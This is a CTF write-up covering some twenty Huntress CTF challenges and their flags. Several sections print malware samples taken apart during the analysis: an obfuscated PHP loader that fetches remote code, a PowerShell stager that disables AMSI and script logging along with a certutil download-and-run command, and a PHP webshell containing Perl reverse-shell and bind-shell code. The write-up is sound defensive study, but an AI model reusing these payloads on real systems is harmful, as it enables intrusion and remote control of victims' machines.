---
title: "CTF: Huntress CTF"
subtitle: ""
draft: false
author: "Hato0"
description: "Huntress CTF was a one month blue team CTF."
Last Update: <time datetime="{{ .Page.Lastmod.Format "Mon Jan 10 17:13:38 2023 -0700" }}" class="text-muted">  {{ $.Page.Lastmod.Format "January 02, 2006" }} </time>
Date: 2023-10-21

tags: ["blueteam", "redteam", "ctf", "development"]
categories: ["CTF - BlueTeam"]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: false
ruby: false
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false
toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
share:
  enable: true
comment:
  enable: false
---
# Huntress Writeup

Each challenges successfully solved will be explained here. The solution will not only be put in writing but also the way of thinking and failed tries will be described. 

Unfortunately, took too long to write it (didn't took note ...) so wasn't able to re-do all the challenges before the server shutdown.

## Read The Rules

This challenge is pretty straight forward. 
Read the rules using the view-source utility and you will find a commented html line with the flag.

![commented html line](https://www.hato0.xyz/images/ctf/huntress/readtherules.png)

*flag: flag{90bc54705794a62015369fd8e86e557b}*

## Notepad

To solve this challenge we will first check what's file we have using the file command.

We can see that the file contains UTF-8 Unicode text: 

![UTF-8 Text](https://www.hato0.xyz/images/ctf/huntress/notepad1.png)

We can just go ahead an cat the file, here goes the flag.

![Cat file](https://www.hato0.xyz/images/ctf/huntress/notepad2.png)

*flag: flag{2dd41e3da37ef1238954d8e7f3217cd8}*

## Technical Support

You just need to join the discord and you will have a flag in the technical support channel. 

![Discord flag](https://www.hato0.xyz/images/ctf/huntress/technicalSupport.png)

*flag: flag{a98373a74abb8c5ebb8f5192e034a91c}*

## String Cheese

We will start by checking if the file is a real png or not. Do to so we will be using the "file" command. 

![file Cheese](https://www.hato0.xyz/images/ctf/huntress/stringCheese.png)

When opening the file, we are not able to see anything appear from the png.

![PNG Cheese](https://www.hato0.xyz/images/ctf/huntress/stringCheese2.png)

From there we will be looking at the strings inside the png flag to check for hidden data: 

![PNG Cheese](https://www.hato0.xyz/images/ctf/huntress/stringCheese3.png)

Got it. Flags was hidden in the PNG file data. 

*flag: flag{f4d9f0f70bf353f2ca23d81dcf7c9099}*

## Query Code

As always we will start by checking what's the file data are using "file" command. 

![File QueryCode](https://www.hato0.xyz/images/ctf/huntress/queryCode1.png)

So the file looks to be a PNG file. 
We will move ahead by renaming the `query_code` to `query_code.png` and open it. 
We are presented with a QRCode. 

Moving through and checking the QRCode value, a text that appears to be the flag was the content of it: 

![Flag QueryCode](https://www.hato0.xyz/images/ctf/huntress/queryCode2.png)

*flag: flag{3434cf5dc6a865657ea1ec1cb675ce3b}*

## Zerion 

We are presented with a PHP file that seems to be obfuscated. This file contains two parts. The first part is a PHP code and the second part is a long string that looks like a reverse base64.

{{< highlight php "lineNos=false" >}}
<?php $L66Rgr=explode(base64_decode("Pz4="),file_get_contents(__FILE__)); $L6CRgr=array(base64_decode("L3gvaQ=="),base64_decode("eA=="),base64_decode(strrev(str_rot13($L66Rgr[1]))));$L7CRgr = "d6d666e70e43a3aeaec1be01341d9f9d";preg_replace($L6CRgr[0],serialize(eval($L6CRgr[2])),$L6CRgr[1]);exit();?>==Dstfmoz5JnxNvolIUqyWUV7xFXa0lWtbQVaD1Wt8QVcNQZlNQrjNvWtZKolITpxtPXtbQVcNlW4qPV6NlW0qPV/NFXjNwZjtUZtLPVm1zpyOUWbtPV/NFXkNQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlW3qPV/NFXlNQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlWlqPV/NFX0NQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xFXa0lWtbQVaZ1Wt8QVcNQZ0NQrjNvWtZKolITpxtPXtbQVcNlW4qPV6NlWmqPV/NFXjNQAjtUZtLPVm1zpyOUWbtPV/NFX4NQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlW3qPV/NFXjRQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlWlqPV/
[...]
{{< /highlight >}}

Reformating this code it produce a decoding routine.

    {{< highlight php "lineNos=false" >}}
<?php 
$payload=explode(base64_decode("Pz4="),file_get_contents(__FILE__)); #get the variable by reading the file content and splitting on "?>"
$payload=array(base64_decode("L3gvaQ=="),base64_decode("eA=="),base64_decode(strrev(str_rot13($payload[1])))); #payload[1] is corresponding to the long string and his decode using the routine : ROT13 -> Reverse -> B64 decode
$L7CRgr = "d6d666e70e43a3aeaec1be01341d9f9d";
preg_replace($payload[0],serialize(eval($payload[2])),$payload[1]); #replacing the php code after execution
exit();
?>
   {{< /highlight >}}

By using Cyberchef we are able to replicate the routine and get the executed payload.

![Zerion](https://www.hato0.xyz/images/ctf/huntress/zerion.png)

    {{< highlight html "lineNos=false" >}}
function GC($a)
{
    $url = sprintf('%s?api=%s&ac=%s&path=%s&t=%s', $a, $_REQUEST['api'], $_REQUEST['ac'], $_REQUEST['path'], $_REQUEST['t']); $code = @file_get_contents($url); if ($code == false) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_USERAGENT, 'll'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_TIMEOUT, 100); curl_setopt($ch, CURLOPT_FRESH_CONNECT, TRUE); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); $code = curl_exec($ch); curl_close($ch); }return $code;}
if (isset($_REQUEST['ac']) && isset($_REQUEST['path']) && isset($_REQUEST['api']) && isset($_REQUEST['t'])) { $code = GC('https://c.-wic5-.com/'); if(!$code){$code = GC('https://c.-oiv3-.com/?flag=flag{af10370d485952897d5183aa09e19883}
');}$need = 
[...]
    {{< /highlight >}}

And we can identify the flag.

*flag: flag{af10370d485952897d5183aa09e19883}*

## Book By Its Cover 

We are presented with a file that have a `.rar` extention. 
As always verify the file type with the `file` command.

It appears to be a PNG and not a RAR so we will go ahead and rename it.

![Book file](https://www.hato0.xyz/images/ctf/huntress/bookCover.png)

Opening it we can see that it's in fact a PNG and more than that the flag ! 

![CTF Book](https://www.hato0.xyz/images/ctf/huntress/bookCover2.png)

*flag: flag{f8d32a346745a6c4bf4e9504ba5308f0}*

## HumanTwo

We are presented with a zip file that contains lot of webshells.  
In the chall introduction we can see that we need to spot the difference in the different files. 

So starting from there we will unzip ressources and perform a diff on it. 

![Human Two check](https://www.hato0.xyz/images/ctf/huntress/human1.png)

To perform the diff we will use the following command : 

    {{< highlight bash "lineNos=false" >}}
for i in ./*; do diff "$i" 0019de2359fe758b0c7cd04c361dfbb798a1d897f3e67de3756645b423dbfe3f; done
    {{< /highlight >}}

We spot a line that looks different that the others : 

![Human Two check](https://www.hato0.xyz/images/ctf/huntress/human2.png)

Analysing the found line (`if (!String.Equals(pass, "666c6167-7b36-6365-3666-366131356464"+"64623065-6262-3333-3262-666166326230"+"62383564-317d-0000-0000-000000000000"))`) we can spot a guid looking like an Hex string. 
Moving from there, you can use cyberchef to decode it as shown below: 

![Human Two check](https://www.hato0.xyz/images/ctf/huntress/human3.png)

And here is the flag ! 

*flag: flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1}*

## Hot Off The Press 

The given file does have an extension but the challenge introduction specify an archive password. So we will go ahead and identify the file type and rename it accordingly.

![hotOfPress identification](https://www.hato0.xyz/images/ctf/huntress/hotOfPress.png)

Using WinUHA we can extract the content of it and find a powershell script. 

![hotOfPress extract](https://www.hato0.xyz/images/ctf/huntress/hotOfPress2.png)

The powershell file contains obfuscated command lines that we will need to decode.

Original:
    {{< highlight powershell "lineNos=false" >}}
C:\Windows\SysWOW64\cmd.exe /c powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c $x_wa3=((''Sc''+''{2}i''+''pt{1}loc{0}Logg''+''in''+''g'')-f''k'',''B'',''r'');If($PSVersionTable.PSVersion.Major -ge 3){ $sw=((''E''+''nable{3}''+''c{''+''1}''+''ip{0}Bloc{2}Logging''+'''')-f''t'',''r'',''k'',''S''); $p8=[Collections.Generic.Dictionary[string,System.Object]]::new(); $gG0=((''Ena''+''ble{2}c{5}i{3}t{''+''4}loc''+''{0}{1}''+''nv''+''o''+''cationLoggi''+''ng'')-f''k'',''I'',''S'',''p'',''B'',''r''); $jXZ4D=[Ref].Assembly.GetType(((''{0}y''+''s''+''tem.{1}a''+''n''+''a{4}ement.A{5}t''+''omati''+''on.{2''+''}ti{3}s'')-f''S'',''M'',''U'',''l'',''g'',''u'')); $plhF=[Ref].Assembly.GetType(((''{''+''6}{''+''5}stem.''+''{''+''3''+''}{9}''+''n{9}{''+''2}ement''+''.{''+''8}{''+''4}t{''+''7''+''}''+''m{9}ti{7}n''+''.''+''{8''+''}''+''m''+''si{0''+''}ti{''+''1}s'')-f''U'',''l'',''g'',''M'',''u'',''y'',''S'',''o'',''A'',''a'')); if ($plhF) { $plhF.GetField(((''''+''a{''+''0}''+''si{4}''+''nit{''+''1}''+''ai''+''l{2}{''+''3}'')-f''m'',''F'',''e'',''d'',''I''),''NonPublic,Static'').SetValue($null,$true); }; $lCj=$jXZ4D.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($lCj) { $a938=$lCj.GetValue($null); If($a938[$x_wa3]){ $a938[$x_wa3][$sw]=0; $a938[$x_wa3][$gG0]=0; } $p8.Add($gG0,0); $p8.Add($sw,0); $a938[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$x_wa3]=$p8; } Else { [Ref].Assembly.GetType(((''S{2}{3}''+''t''+''em''+''.Mana''+''ge''+''ment.{''+''5}{4}to''+''mation.Scr''+''ipt{1}loc{0}'')-f''k'',''B'',''y'',''s'',''u'',''A'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sI''+''AIeJ''+''G2UC/+1X''+''bU/jOBD+3l9hrS''+''IlkU{0}''+''VFvb{1}IiFdWqD''+''bPRJKS8vR''+''brUKy''+''TR168TFcQplb//7''+''jfNSygJ73{1}lI94F''+''IVvwyMx4/M''+''7YfT9PYl5TH''+''hH7sku8VUnxd''+''T3gRMTT/ku''+''/fWUSjS3Mzp''
[...]
    {{< /highlight >}}

We will only decrypt the interesting part with is the Base64 string passed to the GzipStream function.
Using CyberChef we are able to reproduce the decryption routine : 

![hotOfPress deobfuscate](https://www.hato0.xyz/images/ctf/huntress/hotOfPress3.png)

We are presented with a new code snippet containing a new Base 64 to decode:
    {{< highlight powershell "lineNos=false" >}}
[...]
[Byte[]]$nLQ2k = [System.Convert]::FromBase64String("ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlcnR1dGlsIC11cmxjYWNoZSAtZiBodHRwOi8vLjEwMy4xNjMuMTg3LjEyOjgwODAvP2VuY29kZWRfZmxhZz0lNjYlNmMlNjElNjclN2IlNjQlNjIlNjYlNjUlMzUlNjYlMzclMzUlMzUlNjElMzglMzklMzglNjMlNjUlMzUlNjYlMzIlMzAlMzglMzglNjIlMzAlMzglMzklMzIlMzglMzUlMzAlNjIlNjYlMzclN2QgJVRFTVAlXGYgJiBzdGFydCAvQiAlVEVNUCVcZg==")
[Uint32]$fal3 = 0
$lc98 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll VirtualAlloc), (ma1_D @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $nLQ2k.Length,0x3000, 0x04)

[...]
    {{< /highlight >}}

The string extracted from that base64 is a powershell command : `certutil -urlcache -f http://.103.163.187.12:8080/?encoded_flag=%66%6c%61%67%7b%64%62%66%65%35%66%37%35%35%61%38%39%38%63%65%35%66%32%30%38%38%62%30%38%39%32%38%35%30%62%66%37%7d %TEMP%\f & start /B %TEMP%\f`.

The URL decoding of the parameter provide us with the flag ! 


*flag: flag{dbfe5f755a898ce5f2088b0892850bf7}*

## BaseFFFF+1

This chall was one of the most rabitholish of this CTF. The solution is pretty simple but overthinking these chall is also pretty easy.

We are presented with an encoded string :
`鹎驣𔔠𓁯噫谠啥鹭鵧啴陨驶𒄠陬驹啤鹷鵴𓈠𒁯ꔠ𐙡啹院驳啳驨驲挮售𖠰筆筆鸠啳樶栵愵欠樵樳昫鸠啳樶栵嘶谠ꍥ啬𐙡𔕹𖥡唬驨驲鸠啳𒁹𓁵鬠陬潧㸍㸍ꍦ鱡汻欱靡驣洸鬰渰汢饣汣根騸饤杦样椶𠌸`.

Everything has been tried, custom base creation, changing known base decoding alphabet, etc ... 

But the solution is just to read the title and understand it. 
BaseFFFF+1 is basically FFFF in hex which is equal to 65535 +1, that's equal to 65536. So we get Base65536 which is apparently a known base. 

Decoding it with a random online website we get the flag! 

*flag: flag{716abce880f09b7cdc7938eddf273648}*

## Traffic

This challenge wasn't the solve the inteded way but it is what it is. 

We know that we are looking for a "sketchy site". 
So we will go ahead and extract all the data. 

![Traffic decompress](https://www.hato0.xyz/images/ctf/huntress/traffic.png)

Then the cheat happen, just strings file and grep for `sketchy`.

![Traffic decompress](https://www.hato0.xyz/images/ctf/huntress/traffic2.png)

So we've got an intersting domain `sketchysite.github.io`, which by visiting it give the flag.

*flag: flag{8626fe7dcd8d412a80d0b3f0e36afd4a}*

## CaesarMirror

The chall introduction gives us the hint to look for `ROT13`.
We have as material the following text: 
```text
     Bu obl! Jbj, guvf jnezhc punyyratr fher   bf V !erugrtbg ghc bg ahs sb gby n fnj 
    qrsvavgryl nofbyhgryl nyjnlf ybir gelvat   ftavug rivgnibaav qan jra ch xavug bg 
       gb qb jvgu gur irel onfvp, pbzzba naq   sb genc gfevs ruG !frhdvauprg SGP pvffnyp 
     lbhe synt vf synt{whyvhf_ naq gung vf n   tavuglerir gba fv gv gho gengf gnret 
 gung lbh jvyy arrq gb fbyir guvf punyyratr.    qan rqvu bg tavleg rxvy g'abq V 
  frcnengr rnpu cneg bs gur synt. Gur frpbaq   bq hbl gho _n_av fv tnys rug sb genc 
   arrq whfg n yvggyr ovg zber. Jung rknpgyl   rxnz qan leg bg reru rqhypav rj qyhbuf 
     guvf svyyre grkg ybbx zber ratntvat naq   ?fravyjra qqn rj qyhbuF ?ryvujugebj 
    Fubhyq jr nqq fcnprf naq gel naq znxr vg   uthbar fv fravy lanz jbU ?ynpvegrzzlf 
 gb znxr guvf svyyre grkg ybbx oryvrinoyr? N    n avugvj ferggry sb renhdf qvybf 
 fvzcyr, zbabfcnpr-sbag grkg svyr ybbxf tbbq   rug gn gfbzyn rj reN .rz bg uthbar 
   raq? Vg ybbxf yvxr vg! V ubcr vg vf tbbq.   }abvgprysre fv tnys ehbl sb genc qevug ruG 
naq ng guvf cbvag lbh fubhyq unir rirelguvat   ebs tnys fvug gvzohf bg qrra hbl gnug 
    cbvagf. Gur ortvaavat vf znexrq jvgu gur   ,rpneo lyehp tavarcb rug qan kvsrec tnys 
  naq vg vapyhqrf Ratyvfu jbeqf frcnengrq ol   lyehp tavfbyp n av qar bg ,frebpferqah 
  oenpr. Jbj! Abj GUNG vf n PGS! Jub xarj jr   fvug bg erucvp enfrnp rug xyvz qyhbp 
            rkgrag?? Fbzrbar trg gung Whyvhf   !ynqrz n lht enfrnP 
```

Doing a ROT 13 translation gives us the decrypted text for the left part:
```text
Oh boy! Wow, this warmup challenge sure   os I !rehtegot tup ot nuf fo tol a saw 
    definitely absolutely always love trying   sgniht evitavonni dna wen pu kniht ot 
       to do with the very basic, common and   fo trap tsrif ehT !seuqinhcet FTC cissalc 
     your flag is flag{julius_ and that is a   gnihtyreve ton si ti tub trats taerg 
 that you will need to solve this challenge.    dna edih ot gniyrt ekil t'nod I 
  separate each part of the flag. The second   od uoy tub _a_ni si galf eht fo trap 
   need just a little bit more. What exactly   ekam dna yrt ot ereh edulcni ew dluohs 
     this filler text look more engaging and   ?senilwen dda ew dluohS ?elihwhtrow 
    Should we add spaces and try and make it   hguone si senil ynam woH ?lacirtemmys 
 to make this filler text look believable? A    a nihtiw srettel fo erauqs dilos 
 simple, monospace-font text file looks good   eht ta tsomla ew erA .em ot hguone 
   end? It looks like it! I hope it is good.   }noitcelfer si galf ruoy fo trap driht ehT 
and at this point you should have everything   rof galf siht timbus ot deen uoy taht 
    points. The beginning is marked with the   ,ecarb ylruc gninepo eht dna xiferp galf 
  and it includes English words separated by   ylruc gnisolc a ni dne ot ,serocsrednu 
  brace. Wow! Now THAT is a CTF! Who knew we   siht ot rehpic raseac eht klim dluoc 
            extent?? Someone get that Julius   !ladem a yug raseaC 
```

Obvserving the resulting right part we can identify that the sentence are reversed and in the wrong order. Re-formating it give us the following:

```text
Caesar guy a medal!   suiluJ taht teg enoemoS ??tnetxe            
 could milk the caesar cipher to this   ew wenk ohW !FTC a si TAHT woN !woW .ecarb  
 underscores, to end in a closing curly   yb detarapes sdrow hsilgnE sedulcni ti dna  
 flag prefix and the opening curly brace,   eht htiw dekram si gninnigeb ehT .stniop    
 that you need to submit this flag for   gnihtyreve evah dluohs uoy tniop siht ta dna
 The third part of your flag is reflection}   .doog si ti epoh I !ti ekil skool tI ?dne   
 enough to me. Are we almost at the   doog skool elif txet tnof-ecapsonom ,elpmis 
 solid square of letters within a    A ?elbaveileb kool txet rellif siht ekam ot 
 symmetrical? How many lines is enough   ti ekam dna yrt dna secaps dda ew dluohS    
 worthwhile? Should we add newlines?   dna gnigagne erom kool txet rellif siht     
 should we include here to try and make   yltcaxe tahW .erom tib elttil a tsuj deen   
 part of the flag is in_a_ but you do   dnoces ehT .galf eht fo trap hcae etarapes  
 I don't like trying to hide and    .egnellahc siht evlos ot deen lliw uoy taht 
 great start but it is not everything   a si taht dna _suiluj{galf si galf ruoy     
 classic CTF techniques! The first part of   dna nommoc ,cisab yrev eht htiw od ot       
 to think up new and innovative things   gniyrt evol syawla yletulosba yletinifed    
 was a lot of fun to put together! I so   erus egnellahc pumraw siht ,woW !yob hO   
```

By combining the two previous text we are getting the following final text:

```text
     Oh boy! Wow, this warmup challenge sure   Caesar guy a medal!
    definitely absolutely always love trying   could milk the caesar cipher to this 
       to do with the very basic, common and   underscores, to end in a closing curly
     your flag is flag{julius_ and that is a   flag prefix and the opening curly brace,
 that you will need to solve this challenge.    that you need to submit this flag for 
  separate each part of the flag. The second   The third part of your flag is reflection} 
   need just a little bit more. What exactly   enough to me. Are we almost at the 
     this filler text look more engaging and   solid square of letters within a 
    Should we add spaces and try and make it   symmetrical? How many lines is enough 
 to make this filler text look believable? A    worthwhile? Should we add newlines? 
 simple, monospace-font text file looks good   should we include here to try and make 
   end? It looks like it! I hope it is good.   part of the flag is in_a_ but you do 
and at this point you should have everything   I don't like trying to hide and 
    points. The beginning is marked with the   great start but it is not everything
  and it includes English words separated by   classic CTF techniques! The first part of
  brace. Wow! Now THAT is a CTF! Who knew we   to think up new and innovative things 
            extent?? Someone get that Julius   was a lot of fun to put together! I so 
```

From there we can extract the flag ! 

*flag: flag{julius_in_a_reflection}*

## I Wont Let You Down 

For this challenge we are provided with an URL : `http://155.138.162.158`.
Visiting this website we get a video running a *quite* taunting popular song. 

When this chall was released, some issue where seen on the instance, and a lot of incoherence has been seen, so we will only consider the things done in the stable part of the chall.

Doing an nmap, we can find some open ports (nmap is allowed for this chall only).
    {{< highlight bash "lineNos=false" >}}
Nmap scan report for 155.138.162.158.vultrusercontent.com (155.138.162.158)
Host is up (0.14s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8888/tcp open  sun-answerbook

Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds
    {{< /highlight >}}

The SSH might be for Huntress staff to administrate the server, the port 80 is for the web service but the 8888 is quite surprising. 

Looking into it with telnet, got some nice lyrics and the flag ! 

*flag: flag{93671c2c38ee872508770361ace37b02}*

## PHP Stagger

The challenge is to analyze a php file containing a base64 and a piece of code.
The piece of code looks like that : 
    {{< highlight php "lineNos=false" >}}
<?php


 function deGRi($wyB6B, $w3Q12 = '') { $zZ096 = $wyB6B; $pCLb8 = ''; for ($fMp3G = 0; $fMp3G < strlen($zZ096);) { for ($oxWol = 0; $oxWol < strlen($w3Q12) && $fMp3G < strlen($zZ096); $oxWol++, $fMp3G++) { $pCLb8 .= $zZ096[$fMp3G] ^ $w3Q12[$oxWol]; } } return $pCLb8; }
/*iNsGNGYwlzdJjfaQJIGRtTokpZOTeLzrQnnBdsvXYlQCeCPPBElJTcuHmhkJjFXmRHApOYlqePWotTXHMuiuNfUYCjZsItPbmUiXSxvEEovUceztrezYbaOileiVBabK*/

$lBuAnNeu5282 = ")o4la2cih1kp97rmt*x5dw38b(sfy6;envguz_jq/.0";
$gbaylYLd6204 = "LmQ9AT8aND16c2AcMh0lCS9BDFtTATklDzAoARAJCkl+NwQuLTE[...]"
$fsPwhnfn8423 = "";
$oZjuNUpA325 = "";
foreach([24,4,26,31,29,2,37,20,31,6,1,20,31] as $k){
   $fsPwhnfn8423 .= $lBuAnNeu5282[$k];
}
foreach([26,16,14,14,31,33] as $k){
   $oZjuNUpA325 .= $lBuAnNeu5282[$k];
}

/*aajypPZLxFoueiuYpHkwIQbmoSLrNBGmiaDTgcWLKRANAfJxGeoOIzIjLBHHsVEHKTrhqhmFqWgapWrPsuMYcbIZBcXQrjWWEGzoUgWsqUfgyHtbwEDdQxcJKxGTJqIe*/

$k = $oZjuNUpA325('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c');
$c = $k("/*XAjqgQvv4067*/", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302")));
$c();

/*TnaqRZZZJMyfalOgUHObXMPnnMIQvrNgBNUkiLwzwxlYWIDfMEsSyVVKkUfFBllcCgiYSrnTCcqLlZMXXuqDsYwbAVUpaZeRXtQGWQwhcAQrUknJCeHiFTpljQdRSGpz*/
   {{< /highlight >}}

Putting the code in order looks like:
    {{< highlight php "lineNos=false" >}}
<?php
function xorFunction($string, $key='') {
    $text = $string;
    $outText = '';
    for($i=0; $i<strlen($text); )
    {
        for($j=0; ($j<strlen($key) && $i<strlen($text)); $j++,$i++)
        {
            $outText .= $text{$i} ^ $key{$j};
        }
    }
    return $outText;
}
$encodedString = "LmQ9AT8aND16c2AcMh0lCS9BDFtTATklDzAoARAJCkl+NwQuLTE[...]"
$c = create_function("/*XAjqgQvv4067*/", base64_decode(xorFunction(base64_decode($encodedString), "tVEwfwrN302")));
$c();
   {{< /highlight >}}

Creating this routine in CyberChef gives us the code of an php served web page. Only the last part is interesting: 

    {{< highlight php "lineNos=false" >}}
[...]
function actionNetwork() {
	wsoHeader();
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKbXkgJHN0ciA9IDw8RU5EOwpiZWdpbiA2NDQgdXVlbmNvZGUudXUKRjlGUUE5V0xZOEM1Qy0jLFEsVjBRLENEVS4jLFUtJilFLUMoWC0mOUM5IzhTOSYwUi1HVGAKYAplbmQKRU5ECnN5c3RlbSgnL2Jpbi9zaCAtaSAtYyAiZWNobyAke3N0cmluZ307IGJhc2giJyk7CmNsb3NlKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKQ==";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	echo "<h1>Network tools</h1><div class=content>
	<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
[...]
   {{< /highlight >}}

By decoding the base64 we get two pieces of code, the most interesting one is this one :
    {{< highlight php "lineNos=false" >}}
#!/usr/bin/perl
use Socket;
$iaddr=inet_aton($ARGV[0]) || die("Error: $!\n");
$paddr=sockaddr_in($ARGV[1], $iaddr) || die("Error: $!\n");
$proto=getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
my $str = <<END;
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
`
end
END
system('/bin/sh -i -c "echo ${string}; bash"');
close(STDIN);
close(STDOUT);
close(STDERR)
   {{< /highlight >}}

In there we can see a uuencoded strings that we need to decode and here is the flag ! 

*flag: flag{9b5c4313d12958354be6284fcd63dd26}*

## Dialtone

We are provided with a wav file looking like dialtones in a phone. 
Using dtmf we are able to extract the corresponding string. 

![Dialtone](https://www.hato0.xyz/images/ctf/huntress/dialtone.png)

This looks like a long that we need to convert to strings.

We can use the following code snippet : 
    {{< highlight python "lineNos=false" >}}
from Crypto.Util.number import long_to_bytes

data = 13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573
bytes = long_to_bytes(data)
print(bytes)
    {{< /highlight >}}

That return the flag !

*flag: flag{6c733ef09bc4f2a4313ff63087e25d67}*

## Layered Security

Using the `file` command we are seing that the file is in fact a GIMP file.
Opening it in GIMP give us multiple images and on one of them display the flag. 

![Layered](https://www.hato0.xyz/images/ctf/huntress/layered.png)

*flag: flag{9a64bc4a390cb0ce31452820ee562c3f}*

